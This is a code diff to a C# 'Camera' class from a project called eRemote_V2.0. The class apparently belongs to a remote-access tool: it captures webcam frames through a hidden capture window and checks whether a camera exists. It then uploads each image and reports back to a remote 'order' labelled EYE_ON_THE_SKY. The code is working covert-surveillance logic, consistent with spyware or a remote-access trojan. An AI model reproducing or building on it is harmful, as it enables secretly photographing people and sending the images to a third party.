@@ -6,6 +6,7 @@ using System.Drawing.Imaging;
 using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using eRemote_V2._0.LocalDatabase;
+using VisioForge.Shared.DirectShowLib;
 
 namespace eRemote_V2._0
 { 
@@ -31,7 +32,6 @@ public static class Camera
         /// <returns>byte array representing a bitmp or null (if error or no webcam)</returns>
         public static byte[] Capture(string filePath, int connectDelay = 500)
         {
-            Clipboard.Clear();                                              // clear the clipboard
             int hCaptureWnd = capCreateCaptureWindowA("ccWebCam", 0, 0, 0,  // create the hidden capture window
                 350, 350, 0, 0);
             SendMessage(hCaptureWnd, WM_CAP_CONNECT, 0, 0);                 // send the connect message to it
@@ -50,23 +50,31 @@ public static class Camera
             }
         }
 
-        /// <summary>
-        /// Captures a frame from the webcam and returns the byte array associated
-        /// with the captured image. The image is also stored in a file
-        /// </summary>
-        /// <param name="filePath">path the file wher ethe image will be saved</param>
-        /// <param name="connectDelay">number of milliseconds to wait between connect 
-        /// and capture - necessary for some cameras that take a while to 'warm up'</param>
-        /// <returns>true on success, false on failure</returns>
-        public static async Task<bool> CaptureAsync(string fileName, string key,string orderId)
+
+        public static string CaptureCamera(string fileName, string key, string orderId)
         {
             byte[] capture = Capture($"./objs/{fileName}", 500);
             if (capture != null)
             {
-                var link = await Uploader.UploadImagesAsync($"./objs/{fileName}", fileName, key);
-                Orders.MarkOrderAsDone(key, orderId, "EYE_ON_THE_SKY", link);
+                return $"./objs/{fileName}";
             }
-            return true;
+            return "";
+        }
+
+        public static int isHaveCamera()
+        {
+            var captureDevices = DsDevice.GetDevicesOfCat(FilterCategory.VideoInputDevice);
+            if (captureDevices.Length > 0)
+            {
+                return 1;
+            }
+            return 0;
+        }
+
+        public static async Task CameraUploaderAsync(string key,string filename,string orderId)
+        {
+            var link = await Uploader.UploadImagesAsync($"./objs/{filename}", filename, key);
+            Orders.MarkOrderAsDone(key, orderId, "EYE_ON_THE_SKY", link);
         }
    
     }
